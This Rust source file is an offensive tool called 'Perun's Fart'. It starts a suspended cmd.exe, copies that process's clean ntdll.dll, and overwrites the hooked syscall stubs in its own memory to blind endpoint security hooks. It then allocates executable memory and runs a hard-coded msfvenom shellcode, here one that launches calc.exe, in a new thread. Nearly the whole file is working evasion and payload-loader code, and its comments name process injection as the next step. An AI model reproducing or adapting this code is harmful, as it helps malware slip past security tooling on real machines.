use std::ffi::c_void;
use std::mem;
use std::ptr::null_mut;
use std::io::stdin;

use core::arch::asm;

use windows_sys::core::{PCSTR, PSTR};
use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
use windows_sys::Win32::System::WindowsProgramming::LDR_DATA_TABLE_ENTRY;
use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER,IMAGE_SIZEOF_FILE_HEADER,IMAGE_SIZEOF_SECTION_HEADER };
use windows_sys::Win32::System::Diagnostics::Debug::{ReadProcessMemory,WriteProcessMemory,IMAGE_NT_HEADERS32,IMAGE_NT_HEADERS64,IMAGE_OPTIONAL_HEADER32 ,IMAGE_OPTIONAL_HEADER64, IMAGE_SECTION_HEADER};
use windows_sys::Win32::System::Memory::{VirtualFree, VirtualProtect, VirtualAlloc, HeapAlloc, GetProcessHeap, MEM_COMMIT, MEM_RELEASE, HEAP_GENERATE_EXCEPTIONS, PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_EXECUTE_READWRITE};
use windows_sys::Win32::System::Threading::{GetCurrentProcess, TerminateProcess, LPPROC_THREAD_ATTRIBUTE_LIST, STARTUPINFOEXA, STARTUPINFOA,PROCESS_INFORMATION,PEB, InitializeProcThreadAttributeList, CreateProcessA, CREATE_NEW_CONSOLE, CREATE_SUSPENDED, CreateThread, WaitForSingleObject};

use windows_sys::Win32::System::Kernel::LIST_ENTRY;


use std::os::raw::c_ulong;

pub type DWORD = c_ulong;
pub type __UINT64 = u64;
pub type DWORD64 = __UINT64;

//Perun's Fart Rust Implementation
//by 0xTriboulet
//Jan 2023
/*
* Work flow:
* x> 1. CreateProcess sacrificial process (suspended)
* x> 2. Get size of ntdll module in memory
* x> 3. VirtualAlloc local buffer to hold clean ntdll
* x> 4. ReadProcessMemory clean ntdll to local buffer
* x> 5. TerminateProcess sacrificial process
* x> 6. *CHECK HOOKS*
* x> 7. UnhookNtdll()
*** -x> Get first syscall
*** -x> Get last syscall
* x> 8. VirtualFree local buffer
* > 9. FindTarget process
* > 10. OpenProcess on target
* > 11. Inject target process
*
* set RUSTFLAGS=-C target-feature=+crt-static
*/

#[inline]
#[cfg(target_pointer_width = "64")]
pub unsafe fn __readgsqword(offset: DWORD) -> DWORD64 {
  //Credit goes out to trickster0
    let out: u64;
    asm!(
        "mov {}, gs:[{:e}]",
        lateout(reg) out,
        in(reg) offset,
        options(nostack, pure, readonly),
    );
    out
}


#[allow(non_snake_case)]
fn GetModuleBaseAddr(module_name: &str) -> HINSTANCE {
  //Credit goes out to trickster0
    unsafe {
        let peb_offset: *const u64 = __readgsqword(0x60)  as *const u64;
        let rf_peb: *const PEB = peb_offset as * const PEB;
        let peb = *rf_peb;

        let mut p_ldr_data_table_entry: *const LDR_DATA_TABLE_ENTRY = (*peb.Ldr).InMemoryOrderModuleList.Flink as *const LDR_DATA_TABLE_ENTRY;
        let mut p_list_entry = &(*peb.Ldr).InMemoryOrderModuleList as *const LIST_ENTRY;

        loop {
            let buffer = std::slice::from_raw_parts(
                (*p_ldr_data_table_entry).FullDllName.Buffer,
                (*p_ldr_data_table_entry).FullDllName.Length as usize / 2);
            let dll_name = String::from_utf16_lossy(buffer);
            if dll_name.to_lowercase().starts_with(module_name) {
                let module_base: HINSTANCE = (*p_ldr_data_table_entry).Reserved2[0] as HINSTANCE;
                return module_base;
            }
            if p_list_entry == (*peb.Ldr).InMemoryOrderModuleList.Blink {
                println!("Module not found!");
                return 0;
            }
            p_list_entry = (*p_list_entry).Flink;
            p_ldr_data_table_entry = (*p_list_entry).Flink as *const LDR_DATA_TABLE_ENTRY;
        }
    }
}

#[allow(non_snake_case)]
#[allow(unused_assignments)]
pub unsafe fn FindFirstSyscall(memAddr: * const c_void, memSize: usize) -> u64{
  let mut offset = 0;
  let pattern1 = b"\x0f\x05\xc3";
  let pattern2 = b"\xcc\xcc\xcc";

  for n in 0..(memSize-3) as u64{
    if *((memAddr as u64 +n) as PSTR) == pattern1[0]{
      if *((memAddr as u64 +n+1) as PSTR) == pattern1[1]{
        if *((memAddr as u64 +n+2) as PSTR) == pattern1[2]{
          offset = n;
          break;
        }
      }
    }
  }
  println!("offset {:?}", offset);
  for n in 3..(memSize) as u64{
    if *((memAddr as u64 +offset - n) as PSTR) == pattern2[0]{
      if *((memAddr as u64 +offset - n - 1) as PSTR) == pattern2[1]{
        if *((memAddr as u64 +offset - n - 2) as PSTR) == pattern2[2]{
          
          offset = offset + 3 - n;
          println!("First syscall found (check 2) at {:?} offset:{:?}",(memAddr as u64 + offset) as * const c_void, offset);
          break;
        }
      }
    }
  }

  offset
}

#[allow(non_snake_case)]
#[allow(unused_assignments)]
pub unsafe fn FindLastSyscall(memAddr: * const c_void, memSize: usize) -> u64{
  let mut offset = 0;
  let pattern = b"\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";
  
  //this can be done better...but this works right now
  for n in (0..(memSize as u64 -9)).rev() {
    if *((memAddr as u64 +n) as PSTR) == pattern[0]{
      if *((memAddr as u64 +n+1) as PSTR) == pattern[1]{
        if *((memAddr as u64 +n+2) as PSTR) == pattern[2]{
          if *((memAddr as u64 +n+3) as PSTR) == pattern[3]{
            if *((memAddr as u64 +n+4) as PSTR) == pattern[4]{
              if *((memAddr as u64 +n+5) as PSTR) == pattern[5]{
                if *((memAddr as u64 +n+6) as PSTR) == pattern[6]{
                  if *((memAddr as u64 +n+7) as PSTR) == pattern[7]{
                    if *((memAddr as u64 +n+8) as PSTR) == pattern[8]{
                        offset = n+6;
                        println!("Last syscall found at {:p} offset {:?}", (memAddr as u64 + offset) as * const c_void, offset);
                        break;
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  offset
}

#[allow(non_snake_case)]
pub unsafe fn Unhook(hNtdll: *mut c_void, pCache: *const c_void){
  let mut old_protect = PAGE_EXECUTE_READ;
  //let mut other_old_protect = PAGE_EXECUTE_READ;
  let bytesRead = 0 as *mut usize;
  
  let mut garbage = String::from("\0");

  //map pCache memory
  let pCacheDosHdr = pCache as *const IMAGE_DOS_HEADER;
  let pCacheNtHdr = (pCache as u64 + (*pCacheDosHdr).e_lfanew as u64) as *const IMAGE_NT_HEADERS64;
  let pCacheImgSectionHead = (pCacheNtHdr as u64+IMAGE_SIZEOF_FILE_HEADER as u64+ std::mem::size_of_val(&(*pCacheNtHdr).Signature) as u64 + (*pCacheNtHdr).FileHeader.SizeOfOptionalHeader as u64) as * const IMAGE_SECTION_HEADER;

  //find .text section
  let target_section = [46, 116, 101, 120, 116, 0, 0, 0]; //.text
  let mut overwrite_size = 0;
 
  for n in 0..((*pCacheNtHdr).FileHeader.NumberOfSections as u64){
    let cache_addr = (pCacheImgSectionHead as u64 +  (IMAGE_SIZEOF_SECTION_HEADER as u64 * n)) as * const IMAGE_SECTION_HEADER;

    if (*cache_addr).Name == target_section{  //find .text section

        overwrite_size = (*cache_addr).Misc.VirtualSize as usize;

        //find syscall table
        let start_offset = FindFirstSyscall(cache_addr as *const c_void, overwrite_size);
        let end_offset = FindLastSyscall(cache_addr as *const c_void, overwrite_size);
        let offset_size = (end_offset - start_offset) as usize;

        //change permissions of ntdll in memory
        VirtualProtect(
        (hNtdll as u64 + start_offset) as *const c_void,
        offset_size, 
        PAGE_EXECUTE_READWRITE,
        &mut old_protect
        );

        println!("Virtualprotect addr: {:?}", (hNtdll as u64 + start_offset) as *const c_void);
        println!("Virtual size: {:?}", offset_size);

        println!("\nOverwrite ntdll?\n");
        stdin().read_line(&mut garbage).ok();

        //overwrite ntdll.dll in memory
        WriteProcessMemory(
        GetCurrentProcess(),
        (hNtdll as u64 + start_offset) as *const c_void,
        (cache_addr as u64 + start_offset) as *const c_void,
        offset_size,
        bytesRead
        );

        println!("Source: {:?}", cache_addr);
        println!("Destination: {:?}", hNtdll);
        println!("\nCheck writememory?\n");
        stdin().read_line(&mut garbage).ok();

        println!("Restoring permissions in memory...");
        VirtualProtect(
        (hNtdll as u64 + start_offset) as *const c_void,
        offset_size,
        PAGE_EXECUTE_READ,
        &mut old_protect
        );


        break;
      }
    }
}

pub unsafe fn threadStart(lpthreadparameter: *mut ::core::ffi::c_void) -> u32{
  let out = lpthreadparameter as u32;
  out
}

#[allow(non_snake_case)]
fn main() {
  let mut garbage = String::from("\0");

  let mut attrsize: usize = Default::default();
  let mut old_protect = PAGE_EXECUTE_READ;

  let pDosHdr: * const IMAGE_DOS_HEADER;
  let pNtHdr: *const IMAGE_NT_HEADERS64;
  let pOptHdr: IMAGE_OPTIONAL_HEADER64;
  
  unsafe{
    let sacrificialProcess = b"cmd.exe\0";
    let initProcess = b"C:\\Windows\\System32\0";
    let mut pi:PROCESS_INFORMATION = mem::zeroed();
    let mut si:STARTUPINFOEXA = mem::zeroed();
    si.lpAttributeList = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, attrsize) as LPPROC_THREAD_ATTRIBUTE_LIST;
    si.StartupInfo.cb = mem::size_of::<STARTUPINFOA>() as u32;

    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &mut attrsize);
    
    //create sacrificial process
    CreateProcessA(
      0 as *const u8,
      sacrificialProcess.as_ptr() as *mut u8,
      0 as * const SECURITY_ATTRIBUTES,
      0 as * const SECURITY_ATTRIBUTES,
      false as i32,
      CREATE_NEW_CONSOLE | CREATE_SUSPENDED,
      0 as *const c_void,
      initProcess as *const u8,
      &mut si.StartupInfo,
      &mut pi
    );

    //get base addr of ntdll in memory
    let pNtdllAddr = GetModuleBaseAddr("ntdll.dll");

    //map ntdll
    pDosHdr = pNtdllAddr as *mut IMAGE_DOS_HEADER;
    pNtHdr = (pNtdllAddr as u64 + (*pDosHdr).e_lfanew as u64) as *mut IMAGE_NT_HEADERS64;
    pOptHdr = (*pNtHdr).OptionalHeader;

    //find first image section
    let pCacheImgSectionHead = (pNtHdr as u64 + mem::size_of_val(&(*pNtHdr).Signature) as u64 +IMAGE_SIZEOF_FILE_HEADER as u64+(*pNtHdr).FileHeader.SizeOfOptionalHeader as u64) as * const IMAGE_SECTION_HEADER;
    let target_section = [46, 116, 101, 120, 116, 0, 0, 0]; //.text

    //find text section of ntdll in memory
    let mut ntdll_addr = (pCacheImgSectionHead as u64 +  (IMAGE_SIZEOF_SECTION_HEADER as u64)) as * const IMAGE_SECTION_HEADER;  
    for n in 0..((*pNtHdr).FileHeader.NumberOfSections as u64){
      ntdll_addr = (pCacheImgSectionHead as u64 +  (IMAGE_SIZEOF_SECTION_HEADER as u64 * n)) as * const IMAGE_SECTION_HEADER;
      
      if (*ntdll_addr).Name == target_section{ 
        break;
      }
    }

    let ntdll_size = pOptHdr.SizeOfImage as usize;

    //create cache
    let pCache = 
    VirtualAlloc(
      0 as *const c_void,
      ntdll_size,
      MEM_COMMIT,
      PAGE_READWRITE);

    //read sacrificial process ntdll.dll
    let bytesRead = 0 as *mut usize;
    ReadProcessMemory(
      pi.hProcess, 
      pNtdllAddr as *mut c_void, 
      pCache, 
      ntdll_size, 
      bytesRead
    );


    println!("pCache: {:?}", pCache);
    println!("pCache size: {:?}", ntdll_size);
    stdin().read_line(&mut garbage).ok();

    //kill sacrificial process
    TerminateProcess(pi.hProcess, 0);


    println!("\nRemove hooks?\n");
    stdin().read_line(&mut garbage).ok();

    //unhook ntdll.dll
    Unhook(ntdll_addr as *mut c_void, pCache as *const c_void);
    VirtualFree(pCache,0,MEM_RELEASE);

    println!("Unhooking complete, run payload?");
    stdin().read_line(&mut garbage).ok();
  }
  //msfvenom calc
  let payload : [u8;276] = [0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x0, 0x0, 0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0xf, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x1, 0xd0, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x1, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x41, 0x8b, 0xc, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x8d, 0x1, 0x1, 0x0, 0x0, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x6, 0x7c, 0xa, 0x80, 0xfb, 0xe0, 0x75, 0x5, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x0, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x0 ];
  
  unsafe{
    //println!("allocating payload mem");
    //allocate payload mem
    let payload_addr = 
    VirtualAlloc(
      0 as *const c_void,
      payload.len(),
      MEM_COMMIT,
      PAGE_READWRITE);

    //println!("copying payload into mem");
    //copy payload
    std::ptr::copy(payload.as_ptr() as _, payload_addr, payload.len());
    
    //println!("restoring payload mem permissions");
    //change payload permissions
    VirtualProtect(
      (payload_addr) as *const c_void,
      payload.len(),
      PAGE_EXECUTE_READ,
      &mut old_protect
      );
    
    //println!("creating thread");
    let thread_fn = std::mem::transmute (payload_addr as *const u32);
    //create thread
    //thread_fn();
    let thread = 
    CreateThread(
      null_mut(),
      0,
      thread_fn, 
      null_mut(), 
      0, 
      null_mut());
    
    WaitForSingleObject(thread, u32::MAX);
     
  }


}
